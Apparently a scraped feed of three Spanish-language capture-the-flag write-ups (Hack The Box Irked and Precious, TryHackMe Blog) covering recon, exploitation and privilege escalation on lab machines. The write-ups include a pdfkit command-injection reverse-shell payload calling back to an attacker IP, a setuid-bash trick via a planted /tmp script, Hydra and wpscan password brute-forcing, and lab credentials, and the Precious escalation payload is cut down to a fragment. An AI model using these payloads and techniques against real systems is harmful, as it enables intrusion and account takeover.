3 4 5 6 7 8 9 10 11 12 13 14 rcd@irked:/home/djmardov/Documents$ ls -la ls -la total 12 drwxr-xr-x 2 djmardov djmardov 4096 Sep 5 2022 . drwxr-xr-x 18 djmardov djmardov 4096 Sep 5 2022 .. -rw-r--r-- 1 djmardov djmardov 52 May 16 2018 .backup lrwxrwxrwx 1 root root 23 Sep 5 2022 user.txt -\u0026gt; /home/djmardov/user.txt ircd@irked:/home/djmardov/Documents$ cat user.txt cat user.txt cat: user.txt: Permission denied ircd@irked:/home/djmardov/Documents$ cat .backup cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss Probamos a hacer un steghide.\n1 2 3 4 5 6 7 8 steghide --extract -sf irked.jpg Anotar salvoconducto: anot los datos extrados e/\u0026#34;pass.txt\u0026#34;. cat pass.txt ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: pass.txt ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ Kab6h+m+bbp2J:HG Probamos esta contraseña con el usuario djmardov.\n1 2 3 4 5 6 7 8 9 ircd@irked:/home$ su djmardov Password: djmardov@irked:/home$ whoami djmardov djmardov@irked:/home$ Ahora podemos ver la user.txt djmardov@irked:~$ cat user.txt ****************************** Buscamos por SUID para poder escalar privilegios.\nNos debemos fijar en viewuser, que es algo extraño que este ahí.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 find / -perm /4000 2\u0026gt;/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper /usr/sbin/exim4 /usr/sbin/pppd /usr/bin/chsh /usr/bin/procmail /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/at /usr/bin/pkexec /usr/bin/X /usr/bin/passwd /usr/bin/chfn /usr/bin/viewuser \u0026lt;------------------------------- /sbin/mount.nfs /bin/su /bin/mount /bin/fusermount /bin/ntfs-3g /bin/umount Ejecutamos /usr/bin/viewuser. Vemos que no encuentra ese archivo.\n1 2 3 4 5 ./viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2023-03-08 06:49 (:0) sh: 1: /tmp/listusers: not found Por lo tanto lo creamos y le damos permisos de ejecucción. De esta forma nos da una bash que la ejecutamos con privilegios de SUID.\n1 2 3 djmardov@irked:/tmp$ touch listusers djmardov@irked:/tmp$ chmod +x listusers djmardov@irked:/tmp$ echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt; listusers Por lo tanto vamos a volver a ejecutar \u0026ldquo;viewuser.\u0026rdquo;\nYa seremos root y podremos ver la flag.\n1 2 3 4 5 6 7 8 9 10 11 12 djmardov@irked:/tmp$ /usr/bin/./viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2023-03-08 06:49 (:0) djmardov@irked:/tmp$ ls -la /bin/bash -rwsr-xr-x 1 root root 1105840 Nov 5 2016 /bin/bash djmardov@irked:/tmp$ bash -p bash-4.3# whoami root bash-4.3# cd root \u0026amp;\u0026amp; cat root.txt ********************************* ","date":"2023-03-08T00:00:00Z","image":"https://sx1v4n.github.io/p/irked-htb/logo.png","permalink":"https://sx1v4n.github.io/p/irked-htb/","title":"Write Up Irked"},{"content":"Empezamos escaneando los puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 sudo nmap -sS --min-rate 5000 -p- -n -vvv 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 22:33 CET Initiating Ping Scan at 22:33 Scanning 10.10.11.189 [4 ports] Completed Ping Scan at 22:33, 0.07s elapsed (1 total hosts) Initiating SYN Stealth Scan at 22:33 Scanning 10.10.11.189 [65535 ports] Discovered open port 22/tcp on 10.10.11.189 Discovered open port 80/tcp on 10.10.11.189 Completed SYN Stealth Scan at 22:33, 11.43s elapsed (65535 total ports) Nmap scan report for 10.10.11.189 Host is up, received echo-reply ttl 63 (0.11s latency). Scanned at 2023-03-03 22:33:13 CET for 11s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Realizamos virtual hosting.\n1 2 sudo nano /etc/hosts \u0026lt;ip\u0026gt; \u0026lt;domain_name\u0026gt; Podemos crear un servidor local y poniendo nuestra ip para ver si nos lista el directorio.\nEfectivamente nos muestra el directorio.\nHaremos un exiftool para obtener mas datos.\nNos fijamos en la versión, podemos ver si existe algun exploit.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 exiftool okdyddataifm1fyahvphc6a58hczocv7.pdf ExifTool Version Number : 12.56 File Name : okdyddataifm1fyahvphc6a58hczocv7.pdf Directory : . File Size : 33 kB File Modification Date/Time : 2023:03:03 22:45:19+01:00 File Access Date/Time : 2023:03:03 22:45:19+01:00 File Inode Change Date/Time : 2023:03:03 22:45:19+01:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Creator : Generated by pdfkit v0.8.6 Podemos mandarnos una reverse shell.\n1 2 3 4 5 6 7 8 9 Comenzamos creando un servidor \u0026gt; python3 -m http.server 9090 con un nc nos ponemos como escucha \u0026gt; nc -lvnp 9001 Reverse shell \u0026gt; http://10.10.16.9:8080/?name=#{\u0026#39;%20`bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.16.9/9001 \u0026lt;\u0026amp;1\u0026#39;`\u0026#39;} En el usuario \u0026ldquo;ruby\u0026rdquo; encontramos unas credenciales\n1 2 3 4 5 6 7 ruby@precious:~$ cd .bundle cd .bundle ruby@precious:~/.bundle$ cat config cat config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: \u0026#34;henry:Q3c1AqGHtoI0aXAYFH\u0026#34; ruby@precious:~/.bundle$ Por lo tanto podemos acceder por el ssh.\n1 2 3 ssh henry@10.10.11.189 henry@precious:~$ cat user.txt ******************************* hacemos un sudo -l\n1 2 3 4 5 6 henry@precious:/opt$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb Vamos a ver el script de ruby.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 henry@precious:/opt$ cat update_dependencies.rb # Compare installed dependencies with those specified in \u0026#34;dependencies.yml\u0026#34; require \u0026#34;yaml\u0026#34; require \u0026#39;rubygems\u0026#39; # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(\u0026#34;dependencies.yml\u0026#34;)) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \u0026#34;Installed version differs from the one specified in file: \u0026#34; + local_name else puts \u0026#34;Installed version is equals to the one specified in file: \u0026#34; + local_name end end end end henry@precious:/opt$ Vemos que lee el siguiente archivo -\u0026gt; \u0026ldquo;dependencies.yml\u0026rdquo;. Primero ejecutamos el script.\n1 2 3 henry@precious:/opt$ sudo /usr/bin/ruby opt/update_dependencies.rb [sudo] password for henry: Sorry, user henry is not allowed to execute \u0026#39;/usr/bin/ruby opt/update_dependencies.rb\u0026#39; as root on precious. Por lo tanto vamos a ver si podemos editarlo.\n1 2 3 4 5 6 git_set: chmod u+s /bin/bash ls -al /bin/bash bash -p cd root \u0026amp;\u0026amp; cat root.txt **** ","date":"2023-03-04T00:00:00Z","image":"https://sx1v4n.github.io/p/precious-htb/logo.png","permalink":"https://sx1v4n.github.io/p/precious-htb/","title":"Write Up Precious"},{"content":"Comenzamos haciendo un nmap para ver los servicios y puertos que estan abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 Nmap 7.93 scan initiated Wed Feb 1 20:05:11 2023 as: nmap -sCV -p 80,139,22,445 -oN target 10.10.201.18 Nmap scan report for blog.thm (10.10.201.18) Host is up (0.055s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 578ada90baed3a470c05a3f7a80a8d78 (RSA) | 256 c264efabb19a1c87587c4bd50f204626 (ECDSA) |_ 256 5af26292118ead8a9b23822dad53bc16 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Billy Joel\u0026amp;#039;s IT Blog \u0026amp;#8211; The IT blog |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-generator: WordPress 5.0 | http-robots.txt: 1 disallowed entry |_/wp-admin/ 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP) Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb2-time: | date: 2023-02-01T19:05:26 |_ start_date: N/A | smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu) | Computer name: blog | NetBIOS computer name: BLOG\\x00 | Domain name: \\x00 | FQDN: blog |_ System time: 2023-02-01T19:05:26+00:00 |_clock-skew: mean: 2s, deviation: 0s, median: 2s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: BLOG, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 000000000000 (Xerox) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done at Wed Feb 1 20:05:27 2023 -- 1 IP address (1 host up) scanned in 15.52 seconds Realizamos un gobuster para conocer los directorios ocultos.\nEn nuestro caso nos interesa /wp-login.php.\n1 2 3 4 5 6 7 8 9 /rss (Status: 301) [Size: 0] [--\u0026gt; http://10.10.201.18/feed/] /login (Status: 302) [Size: 0] [--\u0026gt; http://blog.thm/wp-login.php] /0 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.201.18/0/] /feed (Status: 301) [Size: 0] [--\u0026gt; http://10.10.201.18/feed/] /atom (Status: 301) [Size: 0] [--\u0026gt; http://10.10.201.18/feed/atom/] /wp-content (Status: 301) [Size: 317] [--\u0026gt; http://10.10.201.18/wp-content/] /admin (Status: 302) [Size: 0] [--\u0026gt; http://blog.thm/wp-admin/] /rss2 (Status: 301) [Size: 0] [--\u0026gt; http://10.10.201.18/feed/] /wp-includes (Status: 301) [Size: 318] [--\u0026gt; http://10.10.201.18/wp-includes/] Para conocer la versión de wordpress que estamos atacando haremos un whatweb.\n1 2 whatweb 10.10.201.18 http://10.10.201.18 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.201.18], MetaGenerator[WordPress 5.0], PoweredBy[-wordpress,-wordpress,,WordPress,WordPress,], Script[text/javascript], Title[Billy Joel\u0026amp;#039;s IT Blog \u0026amp;#8211; The IT blog], UncommonHeaders[link], WordPress[5.0] Como hemos visto anteriormente tenia Samba abierto por lo tanto probamos a entrar.\nDeberemos prestar atención al directorio BillySMB.\n1 2 3 4 5 6 7 8 9 smbclient -L 10.10.201.18 -U guest Password for [WORKGROUP\\guest]: Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers BillySMB Disk Billy\u0026#39;s local SMB Share IPC$ IPC IPC Service (blog server (Samba, Ubuntu)) Reconnecting with SMB1 for workgroup listing. Las fotos no sirven para nada.\nCon BurpSuite podemos ver lo que nos solicita a la hora de el login, por lo tanto gracias a esos datos podemos usar hacer un ataque de fuerza bruta para encontrar el usuario.\nHydra:\n1 2 3 4 5 6 7 8 9 10 11 hydra -L /home/xicor/dic.txt -P /usr/share/wordlists/rockyou.txt 10.10.201.18 http-post-form \u0026#34;/wp-login.php:log=admin^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F\u0026amp;testcookie=1: Invalid username.\u0026#34; Hydra v9.4 (c) 2022 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-01 20:00:20 [DATA] max 16 tasks per 1 server, overall 16 tasks, 186477187 login tries (l:13/p:14344399), ~11654825 tries per task [DATA] attacking http-post-form://10.10.201.18:80/wp-login.php:log=admin^USER^\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F\u0026amp;testcookie=1: Invalid username. [STATUS] 1542.00 tries/min, 1542 tries in 00:01h, 186475645 to do in 2015:32h, 16 active [STATUS] 1535.00 tries/min, 4605 tries in 00:03h, 186472582 to do in 2024:41h, 16 active [80][http-post-form] host: 10.10.201.18 login: kwheel [80][http-post-form] host: 10.10.201.18 login: bjoel Y para la contraseña, podemos hacer un wpscan al usuario kwheel.\n1 2 3 wpscan --url blog.thm/wp-login.php -U kwheel --passwords /usr/share/wordlists/rockyou.txt [SUCCESS] - kwheel / ********* Gracias a estos podemos acceder con un exploit con msfconsole.\nSeteamos los datos necesarios y escribimos run.\nUna vez que hayamos lanzado el exploit , podremos tener un escucha con meterpreter. Para poder tener una shell más estable -\u0026gt;\n1 2 \u0026gt;meterpreter : shell script /dev/null bash -c Una vez que tengamos una shell más estable podemos accer con mysql para poder ver las tablas y obtener otros datos potenciales.\nPara poder escalar privilegios debemos ver los programas que tiene en la ruta /usr/bin, en concreto debemos fijarnos en uno llamado checker.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Podemos hacer un ltrace: ltrace /usr/sbin/checker ltrace /usr/sbin/checker getenv(\u0026#34;admin\u0026#34;) = nil puts(\u0026#34;Not an Admin\u0026#34;Not an Admin ) = 13 +++ exited (status 0) +++ Exportamos la variable admin -\u0026gt; export admin=sx1v4n cd ../../root \u0026amp;\u0026amp; cat root.txt cd / root.txt 9a******************************318 Ahora que somos admin, podemos ver tambien el user.txt alojado en el directorio /media/usb\n1 2 3 root@blog:/root# cat /media/usb/user.txt cat /media/usb/user.txt *********************************** ","date":"2023-02-17T00:00:00Z","image":"https://sx1v4n.github.io/p/blog-thm/logo.png","permalink":"https://sx1v4n.github.io/p/blog-thm/","title":"Write Up Blog"}]